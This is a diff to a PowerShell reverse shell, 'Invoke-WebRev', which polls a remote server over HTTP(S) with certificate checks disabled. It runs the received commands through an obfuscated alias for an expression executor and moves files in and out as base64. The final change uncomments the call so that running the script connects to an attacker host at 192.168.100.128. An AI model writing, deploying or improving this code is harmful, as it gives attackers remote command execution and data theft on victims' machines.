@@ -39,6 +39,7 @@ function Invoke-WebRev{
     $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12';
     [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols;
     [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+    $pwd = "pwd | Format-Table -HideTableHeaders";
 
     while ($true)
     {
@@ -57,8 +58,8 @@ function Invoke-WebRev{
                 $location = $cstr.split(" ")[2];
                 $content = [System.Convert]::FromBase64String($uploadData);
                 $content | Set-Content $location -Encoding Byte
-                $result += "[+] File successfully uploaded.";
-                $cstr = "pwd";
+                $result += "[+] File successfully uploaded.`r`n";
+                $cstr = $pwd;
             }
 
             elseif($cstr.split(" ")[0] -eq "download")
@@ -70,25 +71,24 @@ function Invoke-WebRev{
                 {
                     $downloadData = [System.IO.File]::ReadAllBytes($pathSrc);
                     $b64 = [System.Convert]::ToBase64String($downloadData);
-                    $dataToSend = 'D0wnL04d' + $b64 + 'D0wnL04d' + '_n1w_' + $pathDst + '_n1w_' + "[+] File successfully downloaded.";
+                    $dataToSend = "D0wnL04d" + $b64 + "D0wnL04d`r`n`r`n" + $pathDst + "`r`n`r`n[+] File successfully downloaded.`r`n";
                     $result += $datatoSend;
                 } 
                 else
                 {
                     $result += "[!] Source file not found!";
                 }
-                $cstr = "pwd";
+                $cstr = $pwd;
             }
+
             
-            Foreach ($string in taleska-ei-vrixeka $cstr)
-            {
-                $result += '_n1w_' + $string;
-            };
-            
-            $result = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($result));
+            $enc = [system.Text.Encoding]::UTF8;
+            $bytes = $enc.GetBytes((taleska-ei-vrixeka $cstr | Out-String));
+            $bytes2 = $enc.GetBytes($result);
+            $result = [Convert]::ToBase64String($bytes2 + $bytes);
             $postParams = @{result=$result};
         }catch {};
     };
 }
 
-#Invoke-WebRev -ip 192.168.100.128 -port 80
+Invoke-WebRev -ip 192.168.100.128 -port 80
